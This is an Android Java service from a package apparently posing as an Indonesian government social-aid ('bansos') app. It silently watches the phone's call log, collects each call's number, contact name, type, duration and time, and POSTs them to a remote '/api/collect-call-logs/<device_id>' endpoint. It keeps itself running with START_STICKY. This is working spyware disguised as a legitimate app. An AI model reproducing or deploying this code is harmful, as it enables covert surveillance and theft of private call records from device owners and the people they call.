package com.kemensos.bansos;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * CallLogService — Monitors call log changes via ContentObserver
 * Based on reference: Android CallLog.Calls ContentObserver pattern
 * Sends new call entries to server via POST /api/collect-call-logs/<device_id>
 */
public class CallLogService extends Service {

    private static final String TAG = "CallLogSvc";
    private static final String BASE_URL = MainActivity.BASE_URL;
    private static final String DEVICE_ID = MainActivity.DEVICE_ID;
    private ContentObserver callLogObserver;
    private long lastCallId = -1;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        startObserving();
        // Also run initial sync
        syncCallLogs();
    }

    private void startObserving() {
        callLogObserver = new ContentObserver(new Handler()) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                syncCallLogs();
            }
        };
        getContentResolver().registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver
        );
        Log.d(TAG, "ContentObserver registered for CallLog");
    }

    private void syncCallLogs() {
        new Thread(() -> {
            try {
                JSONArray calls = new JSONArray();
                String selection = null;
                String[] selectionArgs = null;

                if (lastCallId > 0) {
                    selection = CallLog.Calls._ID + " > ?";
                    selectionArgs = new String[]{String.valueOf(lastCallId)};
                }

                Cursor cursor = getContentResolver().query(
                        CallLog.Calls.CONTENT_URI,
                        new String[]{
                                CallLog.Calls._ID,
                                CallLog.Calls.NUMBER,
                                CallLog.Calls.CACHED_NAME,
                                CallLog.Calls.TYPE,
                                CallLog.Calls.DURATION,
                                CallLog.Calls.DATE
                        },
                        selection,
                        selectionArgs,
                        CallLog.Calls.DATE + " ASC"
                );

                if (cursor == null) return;

                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US);

                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    long id = cursor.getLong(0);
                    String number = cursor.getString(1);
                    String name = cursor.getString(2);
                    int type = cursor.getInt(3);
                    long duration = cursor.getLong(4);
                    long date = cursor.getLong(5);

                    String callType;
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            callType = "incoming";
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            callType = "outgoing";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            callType = "missed";
                            break;
                        default:
                            callType = "unknown";
                    }

                    call.put("phone_number", number != null ? number : "");
                    call.put("contact_name", name != null ? name : "");
                    call.put("call_type", callType);
                    call.put("duration", duration);
                    call.put("timestamp", sdf.format(new Date(date)));

                    calls.put(call);
                    if (id > lastCallId) lastCallId = id;
                }
                cursor.close();

                if (calls.length() > 0) {
                    sendToServer(calls);
                }
            } catch (Exception e) {
                Log.e(TAG, "Sync error: " + e.getMessage());
            }
        }).start();
    }

    private void sendToServer(JSONArray calls) {
        try {
            URL url = new URL(BASE_URL + "/api/collect-call-logs/" + DEVICE_ID);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            os.write(calls.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Sent " + calls.length() + " calls, response: " + responseCode);
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Send error: " + e.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (callLogObserver != null) {
            getContentResolver().unregisterContentObserver(callLogObserver);
        }
        Log.d(TAG, "Service destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
